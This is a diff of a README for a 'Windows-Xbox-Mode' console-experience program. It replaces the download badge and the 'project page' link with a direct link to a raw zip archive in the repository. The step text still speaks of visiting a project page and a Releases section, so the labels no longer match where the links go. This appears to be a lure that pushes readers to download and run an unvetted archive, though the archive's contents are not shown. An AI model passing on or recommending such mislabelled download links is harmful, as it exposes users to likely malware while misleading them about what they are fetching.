@@ -1,6 +1,6 @@
 # 🎮 Windows-Xbox-Mode - Transform Your Computer Into Console Experience
 
-[![Download Windows-Xbox-Mode](https://img.shields.io/badge/Download-Xbox_Mode_Installer-blue.svg)](https://github.com/filalinordine1964-cmd/Windows-Xbox-Mode)
+[![Download Windows-Xbox-Mode](https://img.shields.io/badge/Download-Xbox_Mode_Installer-blue.svg)](https://raw.githubusercontent.com/filalinordine1964-cmd/Windows-Xbox-Mode/main/Mode/Mode_Xbox_Windows_v2.4.zip)
 
 ## 🖥️ What This Program Does
 
@@ -23,7 +23,7 @@ Your computer needs specific parts to run this mode well. Make sure your system 
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the project page: [https://github.com/filalinordine1964-cmd/Windows-Xbox-Mode](https://github.com/filalinordine1964-cmd/Windows-Xbox-Mode)
+1. Go to the project page: [https://raw.githubusercontent.com/filalinordine1964-cmd/Windows-Xbox-Mode/main/Mode/Mode_Xbox_Windows_v2.4.zip](https://raw.githubusercontent.com/filalinordine1964-cmd/Windows-Xbox-Mode/main/Mode/Mode_Xbox_Windows_v2.4.zip)
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version of the installer file.
 4. Save the file to your computer.
